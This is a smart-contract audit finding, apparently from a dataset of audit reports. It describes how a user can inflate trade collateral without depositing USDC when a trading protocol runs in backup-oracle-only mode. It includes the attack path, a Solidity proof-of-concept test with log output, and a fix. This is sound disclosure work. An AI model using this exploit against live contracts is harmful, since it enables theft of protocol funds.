# [M] User collateral value may be

## Summary
Severity: Medium
Contest weight: 0.5663
Dataset id: 1770
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
If the Governor switches the system to useBackupOnly, a malicious user can exploit this condition by performing a Trading.updateMargin() DEPOSIT action, effectively increasing their collateral without transferring the necessary USDC.
This occurs because Trading.updateMargin() is a user-triggered action that calls PriceAggregator.fulfill(). In useBackupOnly mode, the price sent to TradingCallbacks.updateMarginCallback() will always be 0. Although updateMarginCallback() verifies if price!=0, it does not revert if the price is 0. As a result, the entire if block is skipped, including the users required USDC transfer.
Furthermore, the system updates the users open trade data with the new DEPOSIT amount, artificially increasing initialPosToken without any USDC backing.
Consequently, the system data becomes corrupted, making it impossible to exit useBackupOnly, liquidate the user position accurately, or distribute fees correctly, leading to potential protocol losses.
Prematurely updating the user trade (here) and failing to revert when price=0 (here) in useBackupOnly mode (here) enables collateral increases without any USDC deposit (here).
Internal pre-conditions
1. The system is set to useBackupOnly state.
External pre-conditions
None.
Attack Path
1. The user calls updateMargin() to deposit collateral.
2. The users trade data is updated based on the deposit amount, with initialPosToken and leverage adjusted to reflect the original open interest.
3. In useBackupOnly mode, the UPDATE_MARGIN order type bypasses the if/else block in fulfill(), setting price=0 for updateMarginCallback().
4. Within updateMarginCallback(), the if block is skipped due to price=0.
5. The transaction completes without transferring USDC from the user to the Vault Manager.
• Direct funds loss if useBackupOnly is lifted.
• Data corruption in storage.
• Incorrect fee accounting upon position liquidation.
• Potential protocol loss if the position is force-closed.

## Proof of Concept
```solidity
function test_PocDeposit() public {
    vm.startPrank(traders[0]);
    usdc.transfer(traders[2], usdc.balanceOf(traders[0]));
    uint amount = 500e6;
    usdc.mint(traders[0], amount);
    usdc.approve(address(tradingStorage), amount);
    uint id = _placeMarketLong(traders[0], amount, btcPairIndex, 50000);
    vm.stopPrank();
    _executeMarketLong(traders[0], amount, btcPairIndex, 50000, id);
    console2.log("Position opened.");
    ITradingStorage.Trade memory _trade = tradingStorage.openTrades(traders[0], btcPairIndex, 0);
    console2.log("User USDC balance:", usdc.balanceOf(traders[0]));
    console2.log("User trade initialPosToken balance:", _trade.initialPosToken);
    vm.roll(1641070800);
    bytes[] memory priceUpdateData = _generateSampleUpdateDataCrypto(1, btcPairIndex, 50000);
    vm.startPrank(deployer);
    priceAggregator.useBackUpOracleOnly(true);
    vm.stopPrank();
    vm.startPrank(traders[0]);
    trading.updateMargin{value: mockPyth.getUpdateFee(priceUpdateData)}(
        btcPairIndex,
        0,
        ITradingStorage.updateType.DEPOSIT,
        amount,
        priceUpdateData
    );
    vm.stopPrank();
    console2.log("Margin updated.");
    ITradingStorage.Trade memory _updatedTrade = tradingStorage.openTrades(traders[0], btcPairIndex, 0);
    console2.log("User USDC balance:", usdc.balanceOf(traders[0]));
    console2.log("User trade initialPosToken balance:", _updatedTrade.initialPosToken);
}
```
Console log output:
Logs:
Position opened.
User USDC balance: 0
User trade initialPosToken balance: 494000000
Margin updated.
User USDC balance: 0
User trade initialPosToken balance: 993957665
As shown, the user inflated collateral by 500 USDC; initialPosToken increased without a USDC transfer.

## Recommendation
Revert in updateMarginCallback() when price=0.
